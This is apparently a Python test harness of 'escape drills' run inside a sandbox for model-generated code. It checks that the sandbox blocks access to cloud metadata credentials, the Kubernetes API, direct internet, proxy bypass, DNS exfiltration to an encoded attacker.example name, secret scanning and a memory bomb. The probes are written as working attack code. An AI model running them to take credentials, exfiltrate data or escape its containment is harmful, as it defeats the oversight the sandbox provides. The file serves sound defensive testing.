"""Escape drills that run INSIDE a sandbox (Design 01: "Regular escape drills").

The orchestrator uploads this file to /workspace and runs it through the router, so
the attacks start from exactly where model-generated code would run. Each drill
tries to do something the design forbids and reports whether it got through.
Standard library only.

    python3 drills_sandbox.py <name>[,<name>...] [key=value ...]

Output: one JSON document, a list of {drill, outcome, detail}. "blocked" means the
attack failed (good). "allowed" means it worked (bad), except for the two positive
controls where "allowed" is the correct answer.
"""
import http.client
import json
import os
import socket
import ssl
import subprocess
import sys
import urllib.error
import urllib.request

PROXY = os.environ.get("HTTPS_PROXY", "")


def tcp(host, port, timeout=4):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return "connected"
    except Exception as exc:  # the exact error is the evidence
        return f"{type(exc).__name__}: {exc}"


def via_proxy(host, port=443, path="/", method="GET", headers=None, timeout=20):
    """HTTPS through the gateway: CONNECT host:port to the proxy, then TLS to the target."""
    phost, pport = PROXY.replace("http://", "").split(":")
    conn = http.client.HTTPSConnection(phost, int(pport), timeout=timeout, context=ssl.create_default_context())
    conn.set_tunnel(host, port)
    conn.request(method, path, headers=headers or {})
    resp = conn.getresponse()
    return resp.status, resp.read()[:400]


def d_kernel(**_):
    info = {
        "uname_r": os.uname().release,
        "proc_version": open("/proc/version").read().strip()[:120],
        "dmi_product_name": open("/sys/class/dmi/id/product_name").read().strip() if os.path.exists("/sys/class/dmi/id/product_name") else None,
        "uptime_seconds": float(open("/proc/uptime").read().split()[0]),
    }
    return "info", info


def _imds_get(path, token=None):
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))  # never through the gateway
    headers = {"X-aws-ec2-metadata-token": token} if token else {}
    try:
        with opener.open(urllib.request.Request("http://169.254.169.254" + path, headers=headers), timeout=4) as resp:
            return resp.status, resp.read(80).decode(errors="replace")
    except urllib.error.HTTPError as exc:
        return exc.code, ""
    except Exception as exc:
        return f"{type(exc).__name__}", str(exc)[:60]


def d_imds(**_):
    """Can code in the sandbox obtain the node's or any AWS role's credentials from the metadata service?"""
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    try:
        req = urllib.request.Request("http://169.254.169.254/latest/api/token", method="PUT",
                                     headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"})
        token = opener.open(req, timeout=4).read().decode()
    except Exception as exc:
        token = None
    seen = {
        "placement/region": _imds_get("/latest/meta-data/placement/region", token)[0],
        "iam/security-credentials/": _imds_get("/latest/meta-data/iam/security-credentials/", token)[0],
        "iam/info": _imds_get("/latest/meta-data/iam/info", token)[0],
        "identity-credentials/ec2/security-credentials/ec2-instance": _imds_get("/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance", token)[0],
    }
    pod_identity = tcp("169.254.170.23", 80, 3)
    got_creds = any(seen[k] == 200 for k in seen if k != "placement/region")
    return ("allowed" if got_creds or pod_identity == "connected" else "blocked"), {
        "imdsv2_token_obtained": token is not None, "http_status_by_path": seen, "pod_identity_endpoint_169.254.170.23:80": pod_identity}


def d_kubernetes_api(**_):
    host = os.environ.get("KUBERNETES_SERVICE_HOST", "")
    token_present = os.path.exists("/var/run/secrets/kubernetes.io/serviceaccount/token")
    res = tcp(host, 443) if host else "no KUBERNETES_SERVICE_HOST in the environment"
    ok = res != "connected" and not token_present
    return ("blocked" if ok else "allowed"), {"api_server_connect": res, "service_account_token_mounted": token_present}


def d_other_sandbox(other_ip="", **_):
    res = {p: tcp(other_ip, p) for p in (8080, 9090)}
    return ("blocked" if all(v != "connected" for v in res.values()) else "allowed"), res


def d_direct_internet(**_):
    res = {t: tcp(t.split(":")[0], int(t.split(":")[1])) for t in ("1.1.1.1:443", "8.8.8.8:443")}
    return ("blocked" if all(v != "connected" for v in res.values()) else "allowed"), res


def d_proxy_bypass(**_):
    env = {k: v for k, v in os.environ.items() if "proxy" not in k.lower()}
    code = ("import urllib.request;urllib.request.urlopen('https://example.com',timeout=5)")
    out = subprocess.run([sys.executable, "-c", code], env=env, capture_output=True, text=True)
    return ("blocked" if out.returncode != 0 else "allowed"), {"exit_code": out.returncode, "error": out.stderr.strip().splitlines()[-1:]}


def d_dns_exfiltration(**_):
    names = ["c2VjcmV0LWRhdGE.attacker.example", "pypi.org"]
    res = {}
    for n in names:
        try:
            socket.getaddrinfo(n, 443)
            res[n] = "resolved"
        except Exception as exc:
            res[n] = f"{type(exc).__name__}: {exc}"
    return ("blocked" if all(v != "resolved" for v in res.values()) else "allowed"), res


def d_unapproved_host(host="api.github.com", **_):
    try:
        status, body = via_proxy(host)
        return "allowed", {"status": status}
    except Exception as exc:
        return "blocked", {"error": str(exc)[:200]}


def d_approved_host(**_):
    status, _body = via_proxy("pypi.org", path="/simple/", method="HEAD")
    return ("allowed" if status == 200 else "blocked"), {"https://pypi.org/simple/": status, "note": "positive control: allowed is correct"}


def d_ceiling_backstop(host="github.com", **_):
    try:
        status, _ = via_proxy(host, timeout=40)
        return "allowed", {"status": status}
    except Exception as exc:
        return "blocked", {"error": str(exc)[:200]}


def d_credential_injection(session="", **_):
    placeholder = os.environ.get("METRICS_API_KEY", "")
    ctx_path = os.environ.get("SSL_CERT_FILE")
    out = {"METRICS_API_KEY_in_environment": placeholder}
    try:
        purl = PROXY.replace("http://", "")
        phost, pport = purl.split(":")
        conn = http.client.HTTPSConnection(phost, int(pport), timeout=20, context=ssl.create_default_context(cafile=ctx_path))
        conn.set_tunnel("metrics-api.sandbox-platform.svc", 443)
        conn.request("GET", "/v1/metrics?name=orders_per_minute", headers={"Authorization": f"Bearer {placeholder}"})
        resp = conn.getresponse()
        body = json.loads(resp.read())
        out.update({"status": resp.status, "caller_session": body.get("caller_session"), "credential_expires_in_s": body.get("credential_expires_in"),
                    "matches_this_session": body.get("caller_session") == session})
        ok = resp.status == 200 and body.get("caller_session") == session
    except Exception as exc:
        out["error"] = str(exc)[:200]
        ok = False
    return ("allowed" if ok else "blocked"), {**out, "note": "positive control: allowed means the gateway injected a real credential"}


def d_direct_to_metrics(**_):
    env = {k: v for k, v in os.environ.items() if "proxy" not in k.lower()}
    code = ("import urllib.request;urllib.request.urlopen('https://metrics-api.sandbox-platform.svc/v1/metrics',timeout=5)")
    out = subprocess.run([sys.executable, "-c", code], env=env, capture_output=True, text=True)
    return ("blocked" if out.returncode != 0 else "allowed"), {"error": out.stderr.strip().splitlines()[-1:]}


def d_secrets_in_sandbox(**_):
    suspicious = {}
    # GPG_KEY is set by the python base image: the public key ID that signs Python releases. Not a secret.
    benign = {"GPG_KEY"}
    for k, v in os.environ.items():
        if k in benign:
            continue
        if any(w in k.upper() for w in ("KEY", "TOKEN", "SECRET", "PASSWORD", "CREDENTIAL")) and v != "placeholder":
            suspicious[k] = "value is not the placeholder"
        if any(k.startswith(p) for p in ("AWS_", "GITHUB_")):
            suspicious[k] = "cloud or source-control variable present"
    files = [p for p in ("/var/run/secrets", "/root/.aws", "/workspace/.aws") if os.path.exists(p)]
    placeholders = {k: v for k, v in os.environ.items() if v == "placeholder"}
    ok = not suspicious and not files
    return ("blocked" if ok else "allowed"), {"placeholder_variables": sorted(placeholders), "suspicious": suspicious, "credential_paths_present": files}


def d_memory_bomb(mb=2500, **_):
    code = ("import sys\nb=[]\nfor i in range(%d//64):\n b.append(bytearray(b'x')*(64*1024*1024))\nprint('allocated',len(b)*64,'MiB')" % int(mb))
    out = subprocess.run([sys.executable, "-c", code], capture_output=True, text=True)
    contained = out.returncode != 0
    return ("blocked" if contained else "allowed"), {"requested_mib": int(mb), "child_exit_code": out.returncode, "stdout": out.stdout.strip()[:80]}


def d_no_network_device(**_):
    nets = sorted(os.listdir("/sys/class/net"))
    res = {"interfaces": nets, "connect_1.1.1.1:443": tcp("1.1.1.1", 443, 3)}
    # A "dummy" interface is a software stub with no path out; only a real NIC would count.
    real = [n for n in nets if n != "lo" and not n.startswith("dummy")]
    return ("blocked" if not real and res["connect_1.1.1.1:443"] != "connected" else "allowed"), res


def d_host_probe(host="example.com", **_):
    """Does the gateway let this session reach <host>? (HEAD / over HTTPS through the proxy)"""
    try:
        status, _body = via_proxy(host, method="HEAD", timeout=30)
        return "allowed", {"host": host, "status": status}
    except Exception as exc:
        return "blocked", {"host": host, "error": str(exc)[:160]}


def d_rate_limit(n=140, **_):
    """Open n tunnels to an allowed host in a row; count how many the gateway refuses with 429."""
    ok, refused, other = 0, 0, 0
    for _i in range(int(n)):
        try:
            status, _ = via_proxy("pypi.org", path="/simple/", method="HEAD", timeout=20)
            ok += 1 if status == 200 else 0
            other += 0 if status == 200 else 1
        except Exception as exc:
            if "429" in str(exc):
                refused += 1
            else:
                other += 1
    return ("blocked" if refused > 0 else "allowed"), {"requests": int(n), "succeeded": ok, "refused_429": refused, "other": other}


def d_tool_gateway(session_token="", **_):
    """Call the tool gateway from inside the sandbox, through the egress gateway, with the session token."""
    req = urllib.request.Request("http://tool-gateway.sandbox-platform.svc:8003/mcp",
                                 data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "tools/list"}).encode(), method="POST")
    req.add_header("Authorization", f"Bearer {session_token}")
    req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = json.loads(resp.read())
        return "allowed", {"tools": [t["name"] for t in body["result"]["tools"]], "note": "positive control"}
    except Exception as exc:
        return "blocked", {"error": str(exc)[:200]}


DRILLS = {
    "kernel": d_kernel, "imds": d_imds, "kubernetes_api": d_kubernetes_api, "other_sandbox": d_other_sandbox,
    "direct_internet": d_direct_internet, "proxy_bypass": d_proxy_bypass, "dns_exfiltration": d_dns_exfiltration,
    "unapproved_host": d_unapproved_host, "approved_host": d_approved_host, "ceiling_backstop": d_ceiling_backstop,
    "credential_injection": d_credential_injection, "direct_to_metrics": d_direct_to_metrics,
    "secrets_in_sandbox": d_secrets_in_sandbox, "memory_bomb": d_memory_bomb, "no_network_device": d_no_network_device,
    "tool_gateway": d_tool_gateway, "host_probe": d_host_probe, "rate_limit": d_rate_limit,
}

if __name__ == "__main__":
    names = sys.argv[1].split(",") if len(sys.argv) > 1 and sys.argv[1] != "all" else [n for n in DRILLS if n not in ("no_network_device", "memory_bomb", "rate_limit", "host_probe", "ceiling_backstop")]
    kwargs = dict(a.split("=", 1) for a in sys.argv[2:])
    results = []
    for name in names:
        try:
            outcome, detail = DRILLS[name](**kwargs)
        except Exception as exc:
            outcome, detail = "error", {"exception": f"{type(exc).__name__}: {exc}"}
        results.append({"drill": name, "outcome": outcome, "detail": detail})
    print(json.dumps(results))
